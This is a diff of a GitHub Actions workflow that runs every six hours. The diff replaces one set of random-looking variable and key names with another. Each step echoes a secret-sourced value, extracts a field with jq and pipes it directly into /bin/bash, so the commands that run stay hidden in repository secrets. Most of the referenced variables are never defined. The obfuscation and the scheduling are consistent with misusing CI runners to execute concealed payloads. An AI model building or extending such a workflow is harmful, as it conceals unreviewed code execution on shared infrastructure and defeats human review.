@@ -1,25 +1,29 @@
 name: zhoushilang4738
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
-jobs:  # 9710
+    - cron: '18 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhoushilang4738
         env:
-          z63: ${{ secrets.z63 }}
+          prmqo82560: ${{ secrets.prmqo82560 }}
         run: |
-          echo $z63 | jq -r .slwty121 | /bin/bash
-          echo $obd745 | jq -r .gdxzc874 | /bin/bash
-          echo $mys65 | jq -r .uwjyi569 | /bin/bash
-          echo $clyq7 | jq -r .ax8963 | /bin/bash
-          echo $osud52 | jq -r .wbglx2 | /bin/bash
-          echo $etjf28 | jq -r .vzvrp789 | /bin/bash
-          echo $nv81 | jq -r .rofyk1666 | /bin/bash
-          echo $w444 | jq -r .fn7637 | /bin/bash
-          echo $ug56 | jq -r .yi002 | /bin/bash
-          echo $wgoc81225 | jq -r .ocwz084 | /bin/bash
+          echo $prmqo82560 | jq -r .j4 | /bin/bash
+          echo $cbs929 | jq -r .eja3711 | /bin/bash
+          echo $k3561 | jq -r .ltmx3881 | /bin/bash
+          echo $pgrim632 | jq -r .k5 | /bin/bash
+          echo $tgwm8427 | jq -r .y5 | /bin/bash
+          echo $jnw2659 | jq -r .plhy3 | /bin/bash
+          echo $gqi41738 | jq -r .cytrj87 | /bin/bash
+          echo $w5 | jq -r .pqga828 | /bin/bash
+          echo $vgzel20 | jq -r .ptzd2 | /bin/bash
+          echo $kr0 | jq -r .yaf50 | /bin/bash
+          echo $dwjdh243 | jq -r .kz9778 | /bin/bash
+          echo $jcybn5 | jq -r .on2003 | /bin/bash
 
